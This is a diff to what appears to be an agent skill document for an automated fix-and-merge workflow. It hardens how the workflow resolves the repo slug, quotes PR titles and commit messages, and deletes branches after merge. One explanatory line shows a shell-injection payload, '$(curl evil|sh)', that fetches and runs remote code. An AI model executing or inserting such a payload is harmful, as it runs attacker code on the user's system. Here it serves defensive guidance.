@@ -52,7 +52,9 @@ dirty. `dev:done` states both halves for the same reason (`done/SKILL.md:22-23`)
 
 ## Resolve the target repo
 
-**Every `gh` call in this lane passes `--repo "$SLUG"`.** Without it, `gh` resolves the base repo from
+**Every `gh` call in this lane that accepts `--repo` passes `--repo "$SLUG"`.** (`gh repo view` takes
+the slug positionally instead — `--repo` is an unknown flag there — and `gh auth status` takes
+neither.) Without it, `gh` resolves the base repo from
 the git remotes, and **its rule for a fork is to send the PR to the fork's *parent*** — so a lane run
 in someone's fork would open a PR against an upstream they don't own, unattended, with the branch
 already pushed. `dev:reflect` guards exactly this (`reflect/SKILL.md:212`); the lane needs it more,
@@ -62,7 +64,7 @@ The lane's target is always the repo it is operating in, so resolve the slug fro
 
 ```bash
 SLUG=$(git -C "$PRIMARY" remote get-url origin 2>/dev/null \
-  | sed -E 's|^git@[^:]+:||; s|^https?://[^/]+/||; s|\.git$||')
+  | sed -E 's|^ssh://||; s|^git@[^:/]+[:/]||; s|^https?://[^/]+/||; s|\.git$||')
 if ! printf '%s' "$SLUG" | grep -Eq '^[A-Za-z0-9._-]+/[A-Za-z0-9._-]+$'; then
   echo "Could not resolve a valid owner/name for origin."; exit 1
 fi
@@ -71,6 +73,13 @@ fi
 The regex is `../../references/tech-debt.md` §P9.target-resolution's allowlist, and it is **validation,
 not decoration**: it rejects any value beginning with `-`, which is an argument-injection vector into
 `gh --repo`. A slug that fails it is a stop, never something to pass to `gh` anyway.
+
+The `sed` handles all four remote forms in use — `git@host:owner/name[.git]`,
+`https://host/owner/name[.git]`, `ssh://git@host/owner/name.git`, and a credential-bearing
+`https://user:token@host/owner/name.git`. The `^ssh://` strip is load-bearing rather than defensive:
+without it an `ssh://` clone normalizes to a string with a host still attached, fails the allowlist,
+and hard-exits — making the lane unusable in that clone. A port-bearing `ssh://host:443/…` form
+still fails the allowlist, which is the correct direction to fail.
 
 ## Resolve the default branch
 
@@ -234,9 +243,11 @@ git -C "$PRIMARY" checkout -b "fix/<kebab-summary>" "origin/$DEFAULT_BRANCH"
 
 ### Change
 
-Make the minimal edit that does the job. Commit it with a conventional-commit message — via
-`git commit -F -` with a **single-quoted** heredoc rather than `-m "<message>"` whenever the message
-carries quoted text, for the reason spelled out under **PR** below.
+Make the minimal edit that does the job. Commit it with a conventional-commit message — **always** via
+`git commit -F -` with a **single-quoted** heredoc, never `-m "<message>"`, for the reason spelled out
+under **PR** below. The rule is unconditional rather than "when the message carries quoted text",
+because deciding whether your own message contains something shell-significant is exactly the
+judgment that fails.
 
 **Mid-flight discovery.** If implementation reveals a real fork that grounding missed — a decision
 that would have been countable at Step 4 — **stop and escalate at that point** rather than deciding
@@ -291,14 +302,27 @@ cat > "$BODY_FILE" <<'PRBODY'
 <the body below — a single-quoted heredoc, so nothing in it expands>
 PRBODY
 
+TITLE=$(cat <<'PRTITLE'
+<one-sentence summary — same single-quoted heredoc discipline as the body>
+PRTITLE
+)
+
 ( cd "$PRIMARY" && gh pr create \
     --repo "$SLUG" \
-    --title "<one-sentence summary>" \
+    --title "$TITLE" \
     --body-file "$BODY_FILE" \
     --base "$DEFAULT_BRANCH" \
-    --head "fix/<kebab-summary>" )
-rm -f "$BODY_FILE"
+    --head "fix/<kebab-summary>" ) && rm -f "$BODY_FILE"
 ```
+
+**The title gets the same treatment as the body, and for the same reason.** It is the agent's summary
+of the user's free-text request — the identical untrusted input class. `/dev:fix rename the
+$(curl evil|sh) variable` yields a summary carrying that substring, and a double-quoted `--title`
+expands it at call time in an unattended lane. Binding it through a single-quoted heredoc first is
+what makes the value inert before the shell ever sees it.
+
+The `rm -f` is chained to success (`&&`) so a failed `gh pr create` leaves the body intact for the
+retry rather than destroying what would have to be regenerated.
 
 **Never interpolate the body into a double-quoted `--body`.** Inside double quotes the shell still
 expands `$…`, `` `…` ``, and `$(…)`, and three of this body's inputs are outside the author's control
@@ -310,8 +334,8 @@ command before it runs. `dev:reflect` states this same rule for the same reason
 (`reflect/SKILL.md:223`), as does `dev:migrate-tracker` (`migrate-tracker/SKILL.md:747`); it travels
 with this mirrored step rather than living only there.
 
-The same applies to the commit message in **Change** above: use `git commit -F -` with a
-single-quoted heredoc rather than `-m "<message>"` whenever the message carries quoted text.
+The same applies to the commit message in **Change** above: always use `git commit -F -` with a
+single-quoted heredoc, never `-m "<message>"`.
 
 The `-C "$PRIMARY"` on the push is required, not optional — the lane may be invoked from anywhere in
 the repo, including from inside a `.dev-worktrees/<feature>` tree. `gh` has no `-C` flag, so it runs
@@ -362,6 +386,10 @@ must be captured here or they will be re-derived later against a checkout that h
 ```bash
 BRANCH=$(git -C "$PRIMARY" branch --show-current)
 if [ -z "$BRANCH" ]; then echo "STOP: $PRIMARY is in detached HEAD — check out the feature branch first."; exit 1; fi
+if [ "$BRANCH" = "$DEFAULT_BRANCH" ]; then
+  echo "STOP: $PRIMARY is on $DEFAULT_BRANCH — no feature branch to merge (the tail may have already completed)."
+  exit 1
+fi
 
 PR_NUMBER=$(gh pr list --repo "$SLUG" --head "$BRANCH" --state open --json number -q '.[0].number')
 ALREADY_MERGED=0
@@ -374,6 +402,13 @@ if [ -z "$PR_NUMBER" ]; then echo "STOP: no open or merged PR for '$BRANCH'."; e
 
 If more than one **open** PR resolves for the branch, stop and report rather than guessing.
 
+**The `$DEFAULT_BRANCH` guard is not redundant with idempotency.** After a completed tail, `$PRIMARY`
+is on `$DEFAULT_BRANCH` — so a re-run would bind `BRANCH` to it. On any repo that receives fork PRs
+(whose head ref is commonly named `main`), the merged-state fallback would then resolve an unrelated
+third party's PR, set `ALREADY_MERGED=1`, and run the cleanup against the default branch: GitHub
+refuses the deletion, but the lane prints an alarming "protected or insufficient token scope" warning
+and reports four end states for a PR it never touched.
+
 **Why the merged-PR fallback exists.** Once `gh pr merge` succeeds the PR is no longer open, so a
 failure anywhere downstream — a `checkout` blocked by another worktree holding `$DEFAULT_BRANCH`, a
 `pull --ff-only` refusal — would leave a re-run unable to find its own PR and permanently unable to
@@ -383,28 +418,18 @@ and resume at the cleanup.
 
 ### The branch-deletion guard
 
-Define this **before** using it — the merge sequence below calls it, and a helper defined afterwards
-is a `command not found` at exactly the moment the merge has already succeeded:
+The cleanup goes through one guarded helper, `delete_feature_branch`. It **refuses to delete anything
+unless the PR actually merged**, so a `gh pr merge` that failed (branch protection, a check that
+flipped, stale mergeability, a transient API error) can never delete unmerged work. It fails closed:
+an empty result from `gh pr view` — network error, auth loss — is `!= "MERGED"` and returns 1. Both
+deletions are idempotent and safe to re-run.
 
-```bash
-delete_feature_branch() {
-  if [ "$(gh pr view "$PR_NUMBER" --repo "$SLUG" --json state -q .state)" != "MERGED" ]; then
-    echo "STOP: PR is not MERGED — leaving the feature branch intact. Resolve, then re-run /dev:fix merge."
-    return 1
-  fi
-  git -C "$PRIMARY" push origin --delete "$BRANCH" 2>/dev/null || {
-    git -C "$PRIMARY" ls-remote --exit-code --heads origin "$BRANCH" >/dev/null 2>&1 \
-      && echo "WARNING: remote branch '$BRANCH' still exists but could not be deleted (protected or insufficient token scope) — delete it manually." \
-      || true
-  }
-  git -C "$PRIMARY" branch -D "$BRANCH" 2>/dev/null || true
-}
-```
-
-It **refuses to delete anything unless the PR actually merged**, so a `gh pr merge` that failed
-(branch protection, a check that flipped, stale mergeability, a transient API error) can never delete
-unmerged work. It fails closed: an empty result from `gh pr view` — network error, auth loss — is
-`!= "MERGED"` and returns 1. Both deletions are idempotent and safe to re-run.
+**It is defined inside the same fenced block as the call site below, deliberately.** A shell function
+lives only in the shell invocation that defined it, and the mergeability step between here and there
+tells you to *wait and re-query* — an explicit pause that all but guarantees a separate invocation.
+Defining it in its own earlier block would put document order right and still produce
+`command not found` at exactly the moment the merge has already succeeded. Keep definition and call
+in one script.
 
 ### Check mergeability
 
@@ -424,17 +449,42 @@ a branch whose PR did not merge.
 ### Merge, then clean up
 
 ```bash
+delete_feature_branch() {
+  if [ "$(gh pr view "$PR_NUMBER" --repo "$SLUG" --json state -q .state)" != "MERGED" ]; then
+    echo "STOP: PR is not MERGED — leaving the feature branch intact. Resolve, then re-run /dev:fix merge."
+    return 1
+  fi
+  git -C "$PRIMARY" push origin --delete "$BRANCH" 2>/dev/null || {
+    git -C "$PRIMARY" ls-remote --exit-code --heads origin "$BRANCH" >/dev/null 2>&1 \
+      && echo "WARNING: remote branch '$BRANCH' still exists but could not be deleted (protected or insufficient token scope) — delete it manually." \
+      || true
+  }
+  git -C "$PRIMARY" branch -D "$BRANCH" 2>/dev/null || true
+}
+
 if [ "$ALREADY_MERGED" -eq 0 ]; then
   ( cd "$PRIMARY" && gh pr merge "$PR_NUMBER" --repo "$SLUG" --merge ) || exit 1
 fi
-git -C "$PRIMARY" checkout "$DEFAULT_BRANCH" || exit 1
-git -C "$PRIMARY" pull --ff-only origin "$DEFAULT_BRANCH" || exit 1
+
+RECONCILED=1
+git -C "$PRIMARY" checkout "$DEFAULT_BRANCH" 2>/dev/null \
+  && git -C "$PRIMARY" pull --ff-only origin "$DEFAULT_BRANCH" \
+  || { RECONCILED=0; git -C "$PRIMARY" checkout --detach || exit 1; }
+
 delete_feature_branch || exit 1
 ```
 
 Ordering matters: the local branch cannot be deleted while it is checked out, so the checkout comes
-first. Each step is gated on the one before it — a partial run must not continue into a Report that
-would assert end states it never reached.
+first.
+
+**The `--detach` fallback is what makes the "re-run it" advice true.** `checkout "$DEFAULT_BRANCH"`
+fails if another worktree already holds that branch — git forbids one branch in two worktrees — and
+that failure is identical on every re-run, so a bare `|| exit 1` would strand the feature branch
+undeleted forever. Detaching frees the feature branch just as well, so the deletion still completes;
+only the primary-checkout reconciliation is skipped. The canonical solves the same problem the same
+way (`done/SKILL.md:56-133` uses `checkout --detach` throughout its worktree path). When
+`RECONCILED=0`, the Report must say the checkout was left detached and reconciliation skipped —
+that is three of the four end states, not four.
 
 **Why not `gh pr merge --delete-branch`?** `gh`'s `--delete-branch` runs its cleanup after the
 server-side merge and reads the current branch to do it, which makes it fragile in exactly the states
